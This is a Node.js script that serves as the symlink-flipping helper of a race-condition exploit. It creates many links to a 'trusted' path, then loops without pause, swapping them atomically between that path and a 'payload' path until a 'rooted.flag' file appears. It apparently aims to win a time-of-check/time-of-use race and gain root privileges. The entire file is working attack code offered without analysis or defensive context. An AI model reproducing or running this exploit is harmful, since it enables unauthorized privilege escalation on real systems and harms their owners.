var fs = require('fs');
var base = process.argv[2], max = Number(process.argv[3]);
var trusted = process.argv[4], payload = process.argv[5];
var logFile = base + '/helper.log', readyFile = base + '/helper.ready';
var rootFlag = base + '/rooted.flag', stopFlag = base + '/stop.flag';
function log(m) { try { fs.appendFileSync(logFile, String(m) + '\n'); } catch (e) {} }
function linkName(j) { return base + '/k3u' + j; }
function tempName(j) { return base + '/k3u' + j + '_t'; }
log('flipper start uid=' + (process.getuid ? process.getuid() : '?') + ' max=' + max);
try {
    for (var j = 0; j < max; j++) {
        fs.symlinkSync(trusted, tempName(j));
        fs.renameSync(tempName(j), linkName(j));
    }
    fs.writeFileSync(readyFile, String(process.pid));
    log('preallocated ' + max + ' unique links');
} catch (e) {
    log('prealloc fatal: ' + e);
    try { fs.writeFileSync(base + '/helper.error', String(e)); } catch (_) {}
    process.exit(1);
}
var idx = 0, n = 0, t = 0, errors = 0;
for (;;) {
    if ((n % 1000) === 0) {
        if (fs.existsSync(rootFlag) || fs.existsSync(stopFlag)) break;
    }
    if (idx + 1 < max) {
        try {
            if (fs.existsSync(base + '/k3c' + (idx + 1))) {
                idx++;
                if (idx < 20 || idx % 100 === 0) log('switch ' + idx);
            }
        } catch (_) {}
    }
    try {
        fs.symlinkSync(t ? payload : trusted, tempName(idx));
        fs.renameSync(tempName(idx), linkName(idx));
        errors = 0;
    } catch (e) {
        errors++;
        if (errors < 10) log('flip error: ' + e);
        if (errors > 1000) {
            try { fs.writeFileSync(base + '/helper.error', String(e)); } catch (_) {}
            process.exit(1);
        }
    }
    t ^= 1;
    if (++n % 100000 === 0) log('flips=' + n + ' idx=' + idx);
}
try { fs.writeFileSync(base + '/helper.done', '1'); } catch (_) {}
log('flipper exiting');
